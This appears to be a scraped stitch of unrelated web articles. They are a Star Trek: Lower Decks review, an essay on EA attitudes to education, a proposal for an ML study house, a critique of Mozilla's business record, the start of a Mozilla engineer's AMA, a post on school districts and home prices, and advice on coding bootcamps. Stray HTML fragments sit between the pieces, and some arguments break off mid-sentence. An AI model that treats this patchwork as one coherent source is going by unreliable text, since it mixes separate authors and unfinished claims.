<p><iframe allowfullscreen="" height="266" src="https://www.youtube.com/embed/V3RkBKedKWw" width="320" youtube-src-id="V3RkBKedKWw"></iframe></p><p><span><span>I recently watched the first episode of <i>Star Trek: Lower Decks</i> and have mixed feelings.</span></span></p><p><span><span>I grew up watching <i>Star Trek: The Next Generation</i>, <i>Deep Space Nine</i> and <i>Voyager</i>, watched the movies and reruns of <i>Star Trek</i>. I played <i>Star Trek </i>games (one of my favorite FPS game of all time is <i>Star Trek Voyager: Elite Force</i>), read the books, comic books and anything else I could devour.&nbsp;</span></span></p><p><span><span>So I was a little bit disappointed when I watched <i>Lower Decks</i>. The idea, in theory, sounds kinda cool: an alternative look at the side of a starship we hardly ever see in the franchise in an animated show designed for the streaming generation. To its credit, the show is colorful and is animated well.</span></span></p><p><span><span>The problem I have with the show is that it doesn't feel like <i>Star Trek</i>. The humor in the show is something which doesn't work - yay, drinking and acting like an ass. Yay, extreme bouts of violence. How very <i>Rick and Morty</i>. Problem is that this isn't that kind of franchise. <i>Star Trek</i>, has never really been about that. You can shove that stuff into it and make it work.&nbsp;</span></span></p><p><span><span>The other major problem I have is that the characters aren't very likeable. The second in command is a bro and extremely annoying, the security chief is a dumb as a rock meathead and the chief medical officer is a typical creepy alien (who is predictably a genius). The captain of the&nbsp;U.S.S. <i>Cerritos</i>, Carol Freeman, lacks presence and serves to serve up potential drama for future episodes (as you'll see in a minute).</span></span></p><p><span><span>Then there are the ensigns. Think cliched, think poor characterization. Beckett Mariner, the smart yet rebellious one is the captain's daughter, is annoying and a poor attempt to create a mature character. Brad Boimler, the wannabe commander who loves following the rules, feels poorly written. D'Vana Tendi, the obligatory alien ensign feels flat and a little two dimensional. Sam Rutherford, the ensign with a Vulcan cyborg implant, is like a rubbish version of Cyborg added to make the show feel relevant to a comic book loving audience.</span></span></p><p><span><span>The problem with all these characters is that they feel like what the writers expect <i>Star Trek </i>fans want. We have the one who follows the rules, the rebellious one, the uncertain one and the cool one. Whatever happened to the idea of just creating memorable characters that work?</span></span></p><p><span><span>I was hoping the premise of the first episode would be a chance to bypass the misgivings I had with the characters. I was wrong. It was a mess, with a subplot of an alien virus inter-meshed with the goings on the planet below and the hilarious setup of some stolen farming equipment. Oh dear. It wasn't very funny at all and lacked the charm and humanity seen from other <i>Star Trek</i> franchises.&nbsp;</span></span></p><p><span><span>I'm not sure I can bring myself to watch another episode. This feels like a missed opportunity and I hope it can be rectified.&nbsp;</span></span></p>&nbsp;</div></div>]]>

  <div itemprop="articleBody">
    <p><em>Crossposted on <a href="https://www.lesswrong.com/posts/JK4Ams4u4Lt3raPHS/the-case-for-education">LessWrong</a> and the <a href="https://forum.effectivealtruism.org/posts/qJzKztKGDbe6iocmz/the-case-for-education">EA Forum</a></em></p>

<p>I discovered the rationalist community two years ago. I had just dropped out of college, was looking for a software engineering job in London, and was in the process of getting what would become <a href="https://quillette.com/2018/11/23/the-case-for-dropping-out-of-college/?v=322b26af01d5">The Case for Dropping Out of College</a> published.</p>

<p>During my research for the piece, I had stumbled on <a href="https://slatestarcodex.com/2015/06/06/against-tulip-subsidies/">Against Tulip Subsidies</a> on Slate Star Codex. I found the post brilliant, and the couple of other posts I then read seemed equally insightful. The site also listed meetups, and so I decided to go to one which was organized by the 'London Rationalish' group.</p>

<p>The people I found there were welcoming, but I was suffering of mild impostor syndrome. At that time, I had only read a handful of SSC posts, and if I recall correctly, I wasn't even aware of the existence of LessWrong.</p>

<p>Also, the fact that many there had advanced degrees didn't help.</p>

<p>Nevertheless, I greatly enjoyed the discussions. I had been interested in EA for at least two years before that and consumed some rationalist-adjacent content such as Sam Harris' podcast, —where I first encountered Yudkowsky. I've also had a long-running interest in psychology, physics, and economics. So, I did end up feeling quite at home culturally.</p>

<p>At the first meetup I attended, I told people my story. I explained why I had dropped out of college, and the conclusions I had come to about the education system in general. I was a little surprised when I was met with near-universal agreement.</p>

<p>I found it quite validating and reassuring. I felt alienated at the time. I felt betrayed by society for keeping up with such a system. I felt doubt, because what are the odds that I had understood the problem, while all the people in charge were all oblivious? I was quite confident in my object-level model, but the <a href="https://www.lesswrong.com/posts/dhj9dhiwhq3DX6W8z/hero-licensing">argument from modesty</a> still made me wonder whether there was something out there that would prove me wrong.</p>

<p>So meeting a group of young highly educated adults who all more or less agreed with me was comforting. But it was also a bit disconcerting. There was something bizarre about finding a group of people who all disavowed the institutions of higher education, while also having spent so much time within them.</p>

<p>Not that there would be anything irrational about it. From an individual perspective, it makes sense to go to college. College may be largely about a zero-sum competition for credentials, but little is achieved by single individuals forgoing getting a college degree. Education is in a bad Nash equilibrium, and only governmental action or mass coordination can get us out of it.</p>

<p>I broadly agree with this position (unlike what the slightly misleading title of my <a href="https://quillette.com/2018/11/23/the-case-for-dropping-out-of-college/">Quillette piece</a> might suggest). But there still is something about this that doesn't sit right with me. An attitude that I have now encountered a few times after having explained that I dropped out of college because it was expensive and I wasn't learning much is something like, "but haven't you heard of <a href="https://www.amazon.com/Case-against-Education-System-Waste/dp/0691196451/">Caplan's work</a>? You have to go to college, or you won't get the signaling."</p>

<p>There is some truth to this, but there is something seriously going wrong when the very people who believe that education is in a bad Nash equilibrium become de facto enforcers of the status quo. Shouldn't EA and rationality be about overcoming this kind of situation? Why have there not been more attempts to bust smart nerds out of the hands of <a href="https://slatestarcodex.com/2014/07/30/meditations-on-moloch/">Moloch</a>? To help them escape the <a href="https://www.lesswrong.com/s/kNANcHLNtJt5qeuSS/p/bQ7BKK5efogcR9YqN">immoral maze</a> that is the current higher education system?</p>

<p>What makes this more depressing is that many of the most prominent EAs are working in higher education, and young EAs are generally advised to gain career capital in the form of university credentials.</p>

<p>At the same time, organizations like 80k and GiveWell generally advise against trying to improve education. In their <a href="https://80000hours.org/problem-profiles/">problem profiles page</a>, 80k presents about 40 problem areas. Not one of them is about education.</p>

<p>But how can it be that EAs see so much wrong with the education system, while also spending so much time in university—and then not see improving education as a cause with a great potential to do good? Shouldn't education be an area with a significant amount of leverage?</p>

<p>How many people have to recognize that higher education is seriously dysfunctional before they should try to coordinate an exit? At what point does a fatalistic attitude vis-a-vis improvements of the education system become a self-fulfilling prophecy?</p>

<p>How many people need to recognize this prisoner's dilemma before they stop defecting?</p>

<p><strong>The Case For Education</strong></p>

<p><em>"Education is the process through which the body of knowledge and culture that we have been accumulating for thousands of years passes from our generation to the next one."</em> -<a href="https://twitter.com/fchollet/status/1278857519784292352">Francois Chollet</a></p>

<p>It's easy to become cynical about higher education.</p>

<p>When I hear praise for the promises and virtues of education I often roll my eyes. Not because I disagree that education has the potential to change the world for the better, but because the institutions that people are defending by making vague idealistic statements about education are doing a terrible job at providing an education that actually has a positive impact.</p>

<p>So let me now make the case <em>for</em> education.</p>

<p>Education is key to civilizational sanity, sensemaking, and survival. Education is key to <a href="https://www.amazon.com/Secret-Our-Success-Evolution-Domesticating/dp/0691178437/">The Secret of our Success</a>.</p>

<p>Education is the <em>scaffolding</em> on which our society, culture and civilization are built and maintained.</p>

<p>For the first two or three decades of people's lives, they are taken on a guided tour of what humanity has learned and achieved. They are taught the laws that govern our universe, how these laws gave rise to life on earth, and ultimately led to the ascent of our species. They are instructed in the history of the ideas that shaped the trajectory of human civilization, the mistakes made along the way, and the principles of rational thought that have allowed the best ideas to win out. They are introduced to the institutions that form the bedrock of society and have allowed the current generation to live in relative prosperity.</p>

<p>And as they learn about the world, and their place in it, they are also shown the construction sites and <a href="https://equilibriabook.com/">inadequacies</a> of our budding collective project so they will be able to contribute to maintaining and improving on what previous generations have built. And so, just as 20,000 years ago, the information needed for the survival and thriving of a hunter-gatherer tribe was transmitted from generation to generation, today the ideas, information and skills necessary for civilizational sanity and the survival of our species continue to be transmitted.</p>

<p>Let me be more specific. There are two areas for which education is needed in the modern world.</p>

<p>The first is economic growth. Education increases human capital and allows people to be more productive. The success of an economy depends on the ability of its participants to create value for others, and it is the acquisition of knowledge and skills, as well as the discovery of new ideas, that allow this.</p>

<p>Thus many economists believe that in order to come out of the slump in productivity growth that has afflicted advanced economies in the past few decades, education is key.</p>

<p>Where these same economists are often <a href="https://thezvi.wordpress.com/2018/04/21/the-case-against-education-foundations/">led astray</a> is in thinking that the solution lies in sending more people to college. The problem being that college has largely turned into a zero-sum competition for credentials, rather than being a place where people learn valuable skills and information that would allow them to succeed in the modern economy. Only a minority of college graduates get to use much of what they learned in college in their professional life.</p>

<p>Critics of this view often appeal to the second area where education is useful—<a href="https://thememeticist.com/education/2020/05/11/education-public-good.html">the public good of an educated citizenry</a>.</p>

<p>This is an important point often overlooked by detractors of the education system.</p>

<p>In theory, a zero-sum competition for credentials can be worth it even if it doesn't lead to the acquisition of skills useful on the labor market if it leads to the positive externality of creating citizens who will productively contribute to resolving problem areas that are left unsolved (or even caused) by free markets. Whether it is by voting, the choice of a career, public service, charitable giving… people have great power to contribute to human flourishing.</p>

<p>And so, an education that is not only job training is crucial for a well-functioning society.</p>

<p>But once again, looking through this lens, the current institutions of higher education perform quite poorly. College grads know little about public affairs, are taught even less about how they might have a positive impact on the world, and even the most prestigious universities—priding themselves on educating the next generation of leaders—seem more set on <a href="https://palladiummag.com/2020/07/27/harvard-creates-managers-instead-of-elites/">creating mid-level managers than an elite that can take on the responsibility of contributing to human progress</a>.</p>

<p>No wonder <a href="https://thememeticist.com/education/2020/05/12/trillion-dollar-bills.html">trillion-dollar bills are regularly left on the sidewalk</a>.</p>

<p>So if education is so important, why do EA orgs like 80k and GiveWell recommend against working to improve it?</p>

<p>Isn't what I have discussed above exactly what EA is all about?</p>

<p>I think the simple answer is that EA and the rationalist community are in fact working to fix education. It's just that there is an implicit understanding in EA and rationalist orgs that the institutions that are conventionally thought to be responsible for providing an education are too broken to be fixed.</p>

<p>After all, you don't get involved in EA or LW by eschewing learning. Quite the contrary. There are few communities that value their education more. One of the most up-voted posts on LessWrong is titled <a href="https://www.lesswrong.com/posts/xg3hXCYQPJkwHyik2/the-best-textbooks-on-every-subject">The Best Textbooks on Every Subject</a>. One of the most up-voted posts on the EA Forum is a <a href="https://forum.effectivealtruism.org/posts/bsE5t6qhGC65fEpzN/growth-and-the-case-against-randomista-development">long post</a> describing the academic literature on the importance of economic growth.</p>

<p>EA orgs don't think that improving education is an important cause because they are the ones providing the education …</p></div></article></div></div></div>

  <div itemprop="articleBody">
    <p><a href="https://thememeticist.com/education/2020/08/14/the-best-educational-institution.html"><em>Important context.</em></a></p>

<p>I am currently planning to rent a large house in northern England, somewhere rents are affordable, for people to study or to research machine learning. ML seems to be an obvious initial choice. I believe that the model of getting a group of smart, somewhat self-motivated people under one roof to work on or study a particular topic, to give them some structure, peer support and accountability, and then to validate progress being made by means of comprehensive standardized exams, is one that could work for any subject.</p>

<p>But since, today already, it is possible to get into ML without traditional qualifications, creating a comprehensive exam isn't really necessary. <a href="https://triplebyte.com/"><em>Triplebyte</em></a>, an American company, has even created something similar already: a background-blind test and interview that places successful candidates directly to the last interview of ML or other programming roles at partnering companies.</p>

<p>All people need is a place to study, work on projects, compete in <a href="https://www.kaggle.com/"><em>Kaggle</em></a> competitions, prepare for interviews or do <a href="https://medium.com/@andreas_madsen/becoming-an-independent-researcher-and-getting-published-in-iclr-with-spotlight-c93ef0b39b8b">independent research</a>. The network effect alone of such a place would probably be incredible. And that would be possible at a significantly lower price than university or bootcamps alike. And for anyone feeling about university and bootcamps as I do, such an environment would also provide a significantly better learning experience.</p>

<p>The key is to attract people who treat their own education as volunteers rather than grudging conscripts, to create the right supportive social environment and productivity norms, and to have an accountability system that would allow everyone to live up to their own ambitions.</p>

<p>The concrete steps that can be taken to create such an environment are subject to iterative experimentation and improvement. A few ideas: having people write down their goals before arriving, regular one-on-one meetings to discuss progress, productivity and difficulties, encouraging work in public spaces, a weekly event to discuss research papers, communal dinners…</p>

<p>But the real innovation here is cultural. The revolutionary potential I see in such a place is not based on some great education technology or new teaching method, but on the expectations of the residents. Expectations of themselves and of others. Expensive and mediocre educational institutions have created the belief among many that learning requires some rigid ritual of lectures, assignments and tests. Those who see past this illusion have the potential to transform our understanding of what an education entails.</p>

<p>If you are interested in coming to such a place, believe that others would benefit from this project getting off the ground, would consider investing, or just believe that such a place should exist, I invite you to add your information <a href="https://docs.google.com/forms/d/e/1FAIpQLSfcb_8PijSmP69-rw1pdr2ZnHEsFK_weApyWzRa9maiF6PCeQ/viewform?usp=sf_link">here</a>, and to share this widely. This becoming a reality will depend on it.</p>

      <p>I love Mozilla, I love its mission, and I love its core product, Firefox. It absolutely sucks as a business though.</p>
      <p>I suspected this for many years, re-realizing it every time <a href="https://news.ycombinator.com/item?id=24120336" target="_blank" rel="noopener">Hacker News</a> or some other story reminded me of its umbilica cord to Google. Relying on one contract to provide over 80% of its revenue<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> every year is bad enough. Forcing itself onto a tightrope walk—privacy as a business model on one side, reliance on your <em>chief competitor</em> (an <em>ad company</em> no less!) to make payroll on the other—is critically negligent.</p>
      <p>Despite Firefox Quantum’s significant improvements over the past three years, I’ve felt for a while that Mozilla has been on a self-inflicted downward spiral and that the number of its eggs in one basket was symptomatic of some yet-unidentified-to-me structural issues. Its <a href="https://blog.mozilla.org/blog/2020/08/11/changing-world-changing-mozilla/" target="_blank" rel="noopener">recent blog post by CEO Mitchell Baker</a> and corresponding <a href="https://blog.mozilla.org/wp-content/uploads/2020/08/Message-to-Employees-Change-in-Difficult-Times.pdf" target="_blank" rel="noopener">internal memo laying off <em>25% of its worforce</em></a> were so resoundingly misguided, though, that <strong>I feared for the first time the organization is all but dead</strong>.</p>
      <p>It’s unclear to me how a message designed to rally the troops and its userbase in a time of crisis could create so much confusion. It appears to be perfectly emblematic, however, of Mozilla’s poor leadership over the last decade, repeated failures at <em>the business side</em> of software development, loss of identity, and inability to innovate while staying <a href="https://www.mozilla.org/en-US/mission/" target="_blank" rel="noopener">true to its mission</a>.</p>
      <p>I use Firefox all day and recommend it. I pay for their limited VPN offering to encourage its development. <strong>I want Mozilla to succeed so badly and deliver on its mission, which is why it’s so painful to feel this way about them.</strong> These are also very hard things to do and as the champion of the “free and open Internet” Mozilla is admittedly held to a very high standard. Its repeated own goals are frustrating and inexcusable, though, and a company of its size and with its brand and trust could succeed with a better direction.</p>
      <h2 id="business">Mozilla is bad at business</h2>
      <p>After over 2 decades as one of the founding Internet companies, Mozilla has shipped essentially one profitable product: Firefox.</p>
      <p>In that time it also <a href="https://en.wikipedia.org/wiki/Usage_share_of_web_browsers" target="_blank" rel="noopener">lost about 80% of Firefox’s browser market share</a><sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> and abandoned its only two other potentially profitable ones, Thunderbird<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> and Firefox OS.</p>
      <p>While it is certainly not required for nonprofits and purpose-driven organizations to sell, they do need to focus on their bottom line if they hope to continue existing. At <a href="https://assets.mozilla.net/annualreport/2018/mozilla-fdn-2018-short-form-final-0926.pdf" target="_blank" rel="noopener">$14MM in 2018</a>, Mozilla’s donations barely scratchd the surface of its $444MM expenses that year.</p>
      <p>Without a fundraising machine, it’s foolish to think Mozilla can continue to develop interesting open source software without any attempts at monetizing it or other endeavors. <strong>It’s also misguided to think that monetizing software means Mozilla has given up on its mission.</strong> Selling software and services is its only path forward and is indeed what it wants to be doing as a mature open source software organization today.</p>
      <p>Unfortunately, instead of realizing this and leveraging its early advantage and market share in a software space <em>where the product is used every day all day by every human being</em>, Mozilla hired consistently bad leaders who set a bad direction, got lazy, and focused on the wrong things.</p>
      <h3 id="slow">Mozilla sat on Firefox’s lead, allowing it to get slow and bloated</h3>
      <p>I was <em>excited</em> to switch away from Firefox in 2009 when Google Chrome became a bit more established. At that point Firefox was much, much better than Internet Explorer 7 and I took advantage of its deep extension ecosystem, but browsing still was slow, the app was very resource intensive, and like all browsers, one tab crashing nuked the whole window. Chrome came out of nowhere and completely reset the expectation on browser speed and footprint. Indeed, it reset the idea of what a good browser even is.</p>
      <ul>
        <li>
          <p><strong>It was very light and fresh</strong>, and its minimalistic interface helped make it <em>feel</em> faster. Tabs moving to the title bar and the removal of anything extra helped the browser get out of the way as much as possible so that I could do what I wanted to do online.</p>
        </li>
        <li>
          <p><strong>The omnibox made search faster.</strong> Combining the dedicated search box and URL bar created huge and unexpected performance gains for me. There was one place to do things—the universal address bar—and I didn’t need to make a decision between URL and search. Firefox did help autocomplete URLs from browsing history, but it still had a dedicated search input. The omnibox removed a big step.</p>
        </li>
        <li>
          <p><strong>Each tab had its own process.</strong> Not only did this prevent the entire browser from crashing when one tab had a problem, it helped speed up browsing even more as there wasn’t one big process for everything.</p>
        </li>
        <li>
          <p><strong>Incognito Mode was very useful.</strong> Safari had apparently had this for years but I wasn’t on a Mac then and Safari wasn’t popular for a lot of other reasons on Windows. While very basic, Incognito windows were my first foray into Internet privacy and became an easy way to load a fresh copy of a website.</p>
        </li>
      </ul>

      <p>Firefox was without question the best browser through the early 2000s and it pushed the web forward in countless ways, often in stark contrast to Microsoft. <a href="https://www.cnet.com/reviews/firefox-3-review/" target="_blank" rel="noopener">Firefox 3 earlier in the year was incredible</a> and set single day download records, but the browser experience was slow and updates felt incremental and not “revolutionary.”</p>
      <p>After Chrome launched, Mozilla started playing catchup and soon began releasing updates to match or mirror its new rival, like moving its tabs up to the title bar and releasing “Private Browsing.” <a href="https://www.technologizer.com/2009/06/30/firefox-3-5-review/2/" target="_blank" rel="noopener">A review of Firefox 3.5</a> captures the beginning of a sentiment that would swell over the next years, emphasis mine:</p>
      <blockquote>
        <p><strong>Today’s most interesting browser isn’t Firefox—it’s Chrome</strong>, with its spare user interface and total focus on making Web apps run seamlessly. The most feature-rich browser continues to be Opera—and with the new Unite server technology, Opera is being daring in a way that Mozilla isn’t.</p>
      </blockquote>
      <p>While Firefox 3.5 was still often recommended as “the most well-rounded browser overall,” users begain saying things like “3.5’s enhancements <em>get Firefox back in the game</em> in several areas where other browsers had jumped ahead.” Speed became the number one factor and Firefox lagged, and as Chrome launched its own extensions the delta began retracting.</p>
      <p>As Mozilla fell behind on speed and footprint, its inability to match Google’s heavy advertising of Chrome sealed its fate. This is perhaps unfair as Google was able to plaster “Download Chrome!” ads on its trillions of pageviews daily, but if Mozilla had stayed hungry and leveraged its position, it could have anticipated the latent demand for a more minimal, faster, and lighter browser. It didn’t and began conceding marketshare with every Chrome release, importantly to many of the IT and tech enthusiasts who recommend and install browsers.</p>
      <p>While I’ve been back and loving Firefox since Quantum came out in 2017 and will not install Google Chrome on any machine my family touches, a lot of damage was done in this time period.</p>
      <h3 id="focus">Somewhere Mozilla lost its focus and has failed to innovate where it matters</h3>
      <p><strong>It cannot be overstated how positive a force Mozilla has been</strong> for open source software and Internet freedom. Their contributions over the past two decades are too numerous to list in full, but to highlight a few: recent technologies like <a href="https://www.rust-lang.org/" target="_blank" rel="noopener">Rust</a>, <a href="https://webassembly.org/" target="_blank" rel="noopener">Web Assembly</a>, and <a href="https://servo.org/" target="_blank" rel="noopener">Servo</a> are really innovative and promising web foundations; its contributions to JavaScript, WebGL, and open codecs like AV1 have been critical; even the MDN web docs are an absolutely wonderful resource.</p>
      <p>Over the past decade, though, a lot of its innovation on core products and services was uninspired at best while some, like Thunderbird, were left to rot. The only <em>relevant</em> innovations I can even think of off the top of my head have been Firefox OS, its promising but failed mobile operating system, and multi-account containers, an actual gamechanger in browsing but really the only homerun there.</p>
      <p>Mozilla bet heavily on Firefox OS and under proper management it could have been <em>the</em> community-driven, open source mobile OS with open standards and APIs and a competing app store. The dream. It <em>still</em> could be a phone I’d be happy to switch to, just as I was eager to at the time, had a proper handset shipped. <a href="https://www.cnet.com/news/why-the-death-of-the-firefox-phone-matters/" target="_blank" rel="noopener">It lasted less than 4 years</a>, due in no small part to <a href="https://medium.com/@bfrancis/the-story-of-firefox-os-cb5bf796e8fb" target="_blank" rel="noopener">their new CEO misunderstanding it</a>, among other issues.</p>
      <p>There have been a lot of distractions during this time as well that have peeled resources away from their foundational product: strange partnerships that send data to third parties (even Google Analytics), social advocacy on issues that have nothing to do with the Internet, and bets on trendy technologies that have gone nowhere.</p>
      <p>Why has Mozilla been investing so heavily into virtual reality? Hubs, a service to launch private virtual rooms together, and Firefox Reality, a VR browser, have gone nowhere and do nothing to “ensure the Internet is a global public resource, open and accessible to all.” Mozilla’s acquisition of Pocket was also strange—its forced Firefox integration as a default super-extension angered much of its core userbase for most likely very, very little in return. It also competes directly with Firefox’s native bookmarks/library, a feature that’s been core to the browser experience since inception and could be held back by this competing service.</p>
      <p>While these trendier areas siphoned resources, Mozilla began playing catchup on its one core product. One look at <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=288704" target="_blank" rel="noopener">some of the longest</a> <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=69687" target="_blank" rel="noopener">and more fundamental outstanding bugs</a> is just a very small revelation into some larger issues as to where the company invests resources and what it focuses on. Chrome may not have even existed had Mozilla been …</p></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Hi everybody, happy Friday! I am Aaron Klotz, a Staff Software Engineer on the GeckoView team at Mozilla Corporation.</p>
<p>I have worked at Mozilla since the fall of 2012 and have worked on three different teams across that time: Performance, Platform Integration &amp; Security Hardening, and finally GeckoView.</p>
<p>Given the recent news about layoffs, I thought it might be cathartic to do an AMA to share my experiences at Mozilla and try to set the record straight the best that I can. I would not dare try this in other forums, but since the Tildes community is capable of civil discussion, I'll do it here! I provided some proof a long time ago when I first joined Tildes, and I'd like to think that many people in this community are willing to vouch for me at this point, but if you want more, I can add it.</p>
<p>Obviously I cannot discuss issues that are covered by my NDA (but fortunately most issues are <em>not</em> covered), and some details I might want to avoid out of sensitivity for people who were laid off. AMAA!</p>
<p><strong>EDIT 1:</strong> Also to make clear (if it wasn't obvious): These opinions are mine and mine alone, do not reflect the opinion of any Mozilla entity, etc. etc.</p>
<p><strong>EDIT 2:</strong> I'm logging off for the night, but I'll try to follow up throughout the weekend if I have time. Thanks for all the questions! Hopefully I've cleared up some things for you!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				
<p>I remember shopping for my first house with my wife and ignoring the school zones and their ratings.  We were solely concentrating on price, square footage, location and appearance.  </p>



<p>While these are all important considerations to take when buying a house, the quality of the schools should have been a big part of it as well.  We didn’t really realize this until it was a bit too late and we had already made a purchase in a bad school district. </p>



<h2>Why would you even ignore school districts?</h2>



<p>Those of you that are new to real estate may wonder why we would ignore it at all.  The reason is simple, price!  It is not uncommon in my city to see a 20% price difference in identical houses in the same general area <a rel="noreferrer noopener" href="https://www.realtor.com/advice/buy/the-right-school-district-how-much-do-schools-affect-real-estate-prices/" target="_blank">based on the school district</a>.</p>



<p>The school district a house is in can be the difference between the house costing $400,000 and $500,000.  It is easy to say “I am not paying $100,000 extra for the same house in a different school district”.</p>



<p>This seems like the reasonable thing to do but it is a false economy.  Your house will become one of your most valuable <a href="https://www.dollartrak.com/2020/05/22/assets-explained/">assets</a> so you owe it to yourself to do a bit more research.  </p>



<h2>How Much Does That Savings Really Cost Me?</h2>



<p>I never asked myself this question until my oldest child was getting close to school age.  Then I sat down and did the math.</p>



<h4>Private School Tuition</h4>



<p>If you plan on having children then I would suggest calling a few of the local private schools and inquiring about their tuition.  In my case private school tuition was around $15,000 per year for each kid!  To make matters worse tuition was rising at rates over 5% a year.</p>



<p>I did some <a href="https://www.dollartrak.com/time-value-of-money/">time value of money</a> calculations on the tuition costs for my two children and 13 years of K-12 private school education for each.  Not accounting for the inflation of prices, each child was going to cost me $195,000 apiece in tuition.  With 5% growth the actual number was <em>over $265,000 for each child</em> through high school!</p>



<p><em>That $100,000 savings on the purchase price of the house was going to cost me over half a million dollars over 13 years.</em></p>



<p>This money would be far better utilized by <a href="https://www.dollartrak.com/college-529-savings-goal/">investing in a 529 plan</a> and using it to pay for a great college education.</p>



<h4>Education is always in demand</h4>



<p>We decided that the poor schools in my area were a cost we were not willing to bear.  We decided to change houses.  </p>



<p>Of course this comes with the huge expense of selling a house where you can lose up to 10% of your house value in fees, expenses, commissions, and closing costs.  This cost around $40,000 in our case.  </p>



<p>On top of that, we found out the hard way that houses in poor school districts are harder to sell while good school district homes can be somewhat recession proof.  In a cool market it took us longer and cost more discounts to unload our old house than expected.  At the same time we had to get into bidding wars on houses in top school districts.</p>



<h4>You can’t sell a diploma but you can sell a house</h4>



<p>When your kids graduate from high school you can always sell the house to get your money back.  Many people want to downsize by this point in their life anyhow.  Since education will still be in demand, you can always sell the house to recoup the extra money you spent.</p>



<p>As the population in our area grew but the number of quality schools stayed the same there was evidence that appreciation of home values were actually higher in good school district areas.  This is likely very local market oriented so you will need to do your own research here.</p>



<h4>What if I don’t and won’t have kids</h4>



<p>I would still consider it even if you don’t plan on needing schools.  Demand was more stable and appreciation rates higher in my area which made it a good financial decision for me even without the private school tuition savings.  </p>



<p>It has been my experience that when people buy into an area based on the quality of schools, parks, etc, they tend to be very motivated to maintain and improve the community.  This just means a better place to hang your hat.</p>



<h4>What if we want to do private school anyhow</h4>



<p>Many people will want to send their kids to private school regardless of the quality of public schools in their area.  What I found was that quality public schools in the area help control the price of private schools in the area.</p>



<p>In a community with bad public schools, private schools can charge whatever they want and people will pay it.  In a community with good public options, private schools have some limitations over what they can get away with.  </p>



<p>It is probably a good idea to do some basic research and check the tuition rates of some private school options.  For my situation they were significantly cheaper in the area with great public schools.</p>



<h4>What about risks to my investment</h4>



<p>Buying in a great school district is not totally risk free.  The schools could devolve in your district and change from an asset to a liability.  I personally don’t see this as a major risk though, as I mentioned earlier the people that buy there are invested in maintaining the community and schools.  If anything, I think the risk of the community falling apart while you live there is lower.</p>



<p>The other way you can be impacted is if you are re-zoned into a different district.  This can be a real risk if you have areas with poor schools adjacent to areas with good schools.  You can get rezoned into a poor school district.  Research how often the schools in the area redistrict.  Moving very close to the school itself can help reduce the risk you are rezoned.</p>



<h2>Conclusion</h2>



<p>I wish I had known then what I know now.  I could have saved myself a lot of hassle and tens of thousands of dollars.  While it may seem like a steep price to pay to get into a good school district, it is often worth it.  </p>



<p>If you don’t ever end up having kids you should at least break even on the purchase difference.  </p>



<p>If you do have kids it will probably save you hundreds of thousands of dollars over the course of their education as well as give you better and easier sales options when you decide to move on. </p>

<p><em>Since publishing this post in October, 2014 I’ve taught or guest lectured at several of Chicago’s developer training programs including Dev Bootcamp, General Assembly, Fullstack Academy, and (now defunct) Startup Institute. While each of these programs is different, this advice generally still applies to anyone interested in joining one of them as a student.</em></p>
<p><em>As with any educational investment, do your homework first. Talk to grads, teachers, and employers before you make the plunge.</em></p>
<hr>
<p>You’ve probably noticed the rise in&nbsp;<a href="https://www.coursereport.com/cities/san-francisco">short-term developer training programs</a> often called “bootcamps.” Dev Bootcamp, General Assembly, Mobile Makers, and Fullstack Academy are just a few of the programs currently operating in Chicago with the goal of training the next generation of entry level software engineers and developers.</p>
<p>If you have a more traditional computer science background you may be skeptical, but these programs aren’t trying to teach all of computer science in a few weeks. Their training programs are more analogous to trade schools, and often they take applicants from non-traditional backgrounds who are looking to make a career transition. The goal of each program varies, but generally they are trying to teach students enough applied knowledge to build a website or mobile app in 6 to 12 weeks.</p>
<h2 id="why-have-these-programs-taken-off-lately">Why have these programs taken off lately?</h2>
<p>The quick pitch for most dev bootcamps is that there are tons of jobs for web developers out there, and in just a few weeks this program&nbsp;will help you&nbsp;learn the ropes to get hired as a Junior Developer.&nbsp;In addition, there are a few other reasons people get hooked:</p>
<h3 id="1-software-startups-are-sexy">1. Software startups are “sexy”</h3>
<p>The stories of Facebook and Twitter’s rocketship style success aren’t going away anytime soon, and they continue to inspire naive youngsters to chase the dream of founding or joining the next massively successful startup. Having been in a couple of failed startups already, I can tell you that it’s rarely this sexy, but the perception that they are keeps bringing in gobs of&nbsp;new interest.</p>
<h3 id="2-there-is-a-serious-lack-of-technical-talent">2. There is a serious lack of technical talent</h3>
<p>The truth is that there is <em>not</em> a lack of talent when it comes to entry level developers, but the need for experienced software engineers is fueling a flood of interest in the profession. It doesn’t hurt that software engineers are often cited in jobs charts (<a href="http://www.npr.org/blogs/money/2014/10/16/356176018/the-most-popular-jobs-for-the-rich-middle-class-and-poor">like this one</a>) that show them making six-figure incomes, although it should be noted that most early-stage startups <a href="https://www.karllhughes.com/posts/myths-working-engineer-startup">aren’t a good choice if salary is your deciding metric</a>.</p>
<h3 id="3-millennials-without-useful-degrees-or-experience-are-desperate">3. Millennials without useful degrees or experience are desperate</h3>
<p>Ah, my generation is growing up, but they’re still looking for get-successful-quick schemes.</p>
<p>I can’t tell you how many times a friend of mine who studied English or Anthropology or Philosophy in undergrad has told me how jealous they are of my engineering degree and my job which although technical still gives me great freedom to flex my creative muscles. I’m not going to say that all of them didn’t work hard in college, but&nbsp;many of the ones who are still living at home chose their majors based on the amount of work they <em>wouldn’t</em> have to do in class. When an offer for&nbsp;a successful career in software development&nbsp;in just 8 weeks comes across their path, you can see why they might be tempted.</p>
<h3 id="4-frameworksoffer-deceptively-easysolutions">4. Frameworks&nbsp;offer deceptively “easy”&nbsp;solutions</h3>
<p>Finally, I have to put some of the blame on the pitch for frameworks like Ruby on Rails. I’m all for using frameworks to help get a project kicked off quickly, but without a base level of knowledge in the language or any idea what object oriented programming means, people hacking on Rails are just dangerous.</p>
<p><strong>There’s a false security in setting up your first Rails app that makes you feel like you know a lot more than you really do.</strong> No matter why they’ve gotten popular,&nbsp;these “bootcamp” programs seem to be here to stay. I don’t think they’re all bad, and I do think they’re actually a more practical solution than trying to go back to college for many people. But, some of them have been misadvertised. Whether you’re thinking about joining one of these bootcamps or thinking about hiring someone who’s recently graduated from one,&nbsp;you should&nbsp;keep your expectations in line with reality.</p>
